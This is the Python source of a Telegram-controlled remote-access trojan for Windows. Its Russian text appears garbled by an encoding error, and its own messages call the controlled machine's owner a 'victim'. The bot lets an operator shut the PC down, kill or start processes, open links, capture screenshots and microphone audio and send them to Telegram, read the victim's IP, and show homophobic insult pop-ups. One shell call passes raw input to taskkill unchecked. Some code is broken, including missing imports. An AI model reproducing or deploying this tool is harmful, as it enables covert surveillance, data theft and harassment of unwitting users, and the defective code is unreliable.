import random,telebot,os,webbrowser,pyautogui,time,requests,re
from PIL import Image, ImageGrab
from bs4 import BeautifulSoup
from playsound import playsound



mytoken = 'telegram token'

bot = telebot.TeleBot(mytoken)

mainkeyboard = telebot.types.ReplyKeyboardMarkup(True, True)

mainkeyboard.row('–ü–∏—Ç–∞–Ω–∏–µüü¢','–ó–∞–ø–∏—Å—åüîä','–ë—Ä–∞—É–∑–µ—Äüü°','–ü—Ä–∏–ª–æ–∂–µ–Ω–∏—èüü•','ipüà¥')


powerkeyboard = telebot.types.ReplyKeyboardMarkup(True, True)

powerkeyboard.row('–ù–∞–∑–∞–¥üóø','–í—ã–∫–ª—é—á–∏—Ç—å –ø–∫‚ö†Ô∏è','–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–∫üñ•')




@bot.message_handler(content_types=['text'])
def commands(message):
        
        
        
        
        if message.text == '/start':
                bot.send_message(message.chat.id,'–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ',reply_markup=mainkeyboard)
                
                
                
        if message.text == '–ü–∏—Ç–∞–Ω–∏–µüü¢':
                bot.send_message(message.chat.id,'–í—ã–±–µ—Ä–∏ –¥–µ–π—Å—Ç–≤–∏–µ',reply_markup=powerkeyboard)
                
                
        if message.text == '–ù–∞–∑–∞–¥üóø':
                bot.send_message(message.chat.id,'–í–µ—Ä–Ω—É–ª –≤–∞—Å –Ω–∞–∑–∞–¥',reply_markup=mainkeyboard)

        
    
        elif message.text == '/off' or message.text == '–í—ã–∫–ª—é—á–∏—Ç—å –ø–∫‚ö†Ô∏è':
                bot.send_message(message.chat.id,'–ö–æ–º–ø—å—é—Ç–µ—Ä –±—É–¥–µ—Ç –≤—ã–∫–ª—é—á–µ–Ω!')
                os.system('shutdown -s')

        
        elif message.text == '/help':
                 bot.send_message(message.chat.id,'/off(–≤—ã–∫–ª –ø–∫)\n/open(–æ—Ç–∫—Ä—ã—Ç—å —Å—Å—ã–ª–∫—É –≤ –±—Ä–∞—É–∑–µ—Ä–µ)\n/screen(—Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç —ç–∫—Ä–∞–Ω–∞)\n/process(–≤–∫–ª—é—á–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å)\n/kill(—É–±–∏—Ç—å –ø—Ä–æ—Ü–µ—Å—Å)\n/reboot(–ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–∫)\n/window(—Ç–µ—Å—Ç –Ω–∞ –≥–µ—è)\n/ip(—É–∑–Ω–∞—Ç—å ip,–≥–æ—Ä–æ–¥,–±—Ä–∞—É–∑–µ—Ä)\n/rep(–∑–∞–ø—É—Å—Ç–∏—Ç—å —Ñ–∞–π–ª.mp3)\n/record(–∑–∞–ø–∏—Å–∞—Ç—å –∑–≤–∫–∏ —Å –º–∏–∫—Ä–æ—Ñ–æ–Ω–∞)')
                

              
        
        elif message.text == '/open':
                bot.register_next_step_handler(message,get_url)
                bot.send_message(message.chat.id,'–û—Ç–ø—Ä–∞–≤—å—Ç–µ —Å—Å—ã–ª–∫—É!')
                

        elif message.text == '/screen':
                try:  
                        os.remove("screenshot.png")
                except:
                        bot.send_message(message.chat.id,'–î–µ–ª–∞—é —Å–∫—Ä–∏–Ω—à–æ—Ç')
                        screen = pyautogui.screenshot('screenshot.png')
                        screen = open('screenshot.png', 'rb')
                        bot.send_photo(message.chat.id, screen)
                
        elif message.text == '/process':
                bot.send_message(message.chat.id,'–ö–∞–∫–æ–π –ø—Ä–æ—Ü–µ—Å—Å —Ö–æ—Ç–∏—Ç–µ –∑–∞–ø—É—Å—Ç–∏—Ç—å(steam.exe)')
                bot.register_next_step_handler(message,get_process)
        
        
        elif message.text == '/ip':
                url = 'https://yandex.ru/internet/'
                page = requests.get(url)
                soup = BeautifulSoup(page.text, "html.parser")
                ip = soup.findAll('ul', class_='general-info layout__general-info')
                ip = str(ip)
                ip = re.sub('<[^>]*>', '\n', ip)
                bot.send_message(message.chat.id,'–ê–π–ø–∏ –∂–µ—Ä—Ç–≤—ã - ' + str(ip))
        
        
        
        elif message.text == '/window':
                pyautogui.alert("–¢—ã –ø–∏–¥–æ—Ä", "–¢–µ—Å—Ç", button="–¥–∞")
                pyautogui.alert("–¢—ã –≥–µ–π", "–¢–µ—Å—Ç", button="–¥–∞")
                bot.send_message(message.chat.id,'–û–∫–Ω–∞ —Å —Ç–µ—Å—Ç–æ–º –Ω–∞ –≥–µ—è —Å–æ–∑–¥–∞–Ω—ã')
                
        elif message.text == '/kill':
                bot.send_message(message.chat.id,'–ö–∞–∫–æ–π –ø—Ä–æ—Ü–µ—Å—Å —Ö–æ—Ç–∏—Ç–µ —É–±–∏—Ç—å(steam.exe)')
                bot.register_next_step_handler(message,get_kill)                   
                
                
        elif message.text == '/reboot' or message.text == '–ü–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–∫üñ•':
                os.system('shutdown -r -t 0')

        elif message.text == '/rep':
                bot.send_message(message.chat.id,'–ö–∞–∫–æ–π —Ñ–∞–π–ª –≤—ã —Ö–æ—Ç–∏—Ç–µ –≤–∫–ª—é—á–∏—Ç—å?')
                bot.register_next_step_handler(message,get_audio)    
  

        
        
        elif message.text == '/record':
                bot.send_message(message.chat.id,'–°–∫–æ–ª—å–∫–æ —Å–µ–∫—É–Ω–¥ –∑–∞–ø–∏—Å–∞—Ç—å?(–Ω–µ –±–æ–ª—å—à–µ 60):')
                bot.register_next_step_handler(message,get_record)

           


        
        
def get_record(message):
        global record
        record = message.text
        try:
                record = int(record)
                if record < 60:
                        bot.send_message(message.chat.id,'–ó–∞–ø–∏—Å—ã–≤–∞—é,–ø–æ–¥–æ–∂–¥–∏')
                        CHUNK = 1024
                        FORMAT = pyaudio.paInt16
                        CHANNELS = 1
                        RATE = 44100
                        RECORD_SECONDS = record
                        WAVE_OUTPUT_FILENAME = "audio.wav"
                        p = pyaudio.PyAudio()
                        stream = p.open(format=FORMAT,
                                        channels=CHANNELS,
                                        rate=RATE,
                                        input=True,
                                        input_device_index=1, 
                                        frames_per_buffer=CHUNK)
                        frames = []
                        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
                            data = stream.read(CHUNK)
                            frames.append(data)
                        stream.stop_stream()
                        
                        stream.close()
                        
                        p.terminate()

                        wf = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
                        
                        wf.setnchannels(CHANNELS)
                        
                        wf.setsampwidth(p.get_sample_size(FORMAT))
                        
                        wf.setframerate(RATE)
                        
                        wf.writeframes(b''.join(frames))
                        
                        wf.close()

                        audio = open('audio.wav', 'rb')
                        
                        bot.send_audio(message.chat.id, audio)


                else:
                        bot.send_message(message.chat.id,'—Å–∫–∞–∑–∞–Ω–æ –Ω–µ –±–æ–ª—å—à–µ 60sec!')
                
        except:
                bot.send_message(message.chat.id,'–≤ —á–∏—Å–ª–æ–≤–æ–º —Ñ–æ—Ä–º–∞—Ç–µ!')

        
        
        
def get_audio(message):
        global audio
        audio = message.text
        try:
                playsound(audio)
                bot.send_message(message.chat.id,'–í–∫–ª—é—á–∏–ª –¥–∞–Ω–Ω—ã–π —Ñ–∞–π–ª\n ' + audio)
        except:
                bot.send_message(message.chat.id,'–ù–µ –Ω–∞—à–µ–ª –¥–∞–Ω–Ω—ã–π —Ñ–∞–π–ª\n ' + audio)
                
                




def get_url(message):
        global url
        url = message.text
        webbrowser.open_new(url)
        bot.send_message(message.chat.id,'–°—Å—ã–ª–∫–∞ –æ—Ç–∫—Ä—ã—Ç–∞!')


        
        
def get_process(message):
        global process
        process = message.text
        try:
                os.startfile(process)
                bot.send_message(message.chat.id,'–í–∫–ª—é—á–∏–ª –¥–∞–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å\n' + process)
        except:
                 bot.send_message(message.chat.id,'–í—ã –≤–≤–µ–ª–∏ —á—Ç–æ-—Ç–æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ,–æ—à–∏–±–∫–∞!')

                        
                        
                        
                        
def get_kill(message):
        global kill
        kill = message.text
        try:
                os.system("taskkill /im " + kill)
                bot.send_message(message.chat.id,'–î–∞–Ω–Ω—ã–π –ø—Ä–æ—Ü–µ—Å—Å —É–±–∏—Ç\n' + kill)
        except:
                bot.send_message(message.chat.id,'–í—ã –≤–≤–µ–ª–∏ —á—Ç–æ-—Ç–æ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω–æ,–æ—à–∏–±–∫–∞!')

                
                        
         
try:
        bot.polling(none_stop=True, interval=0)
except:
        pass
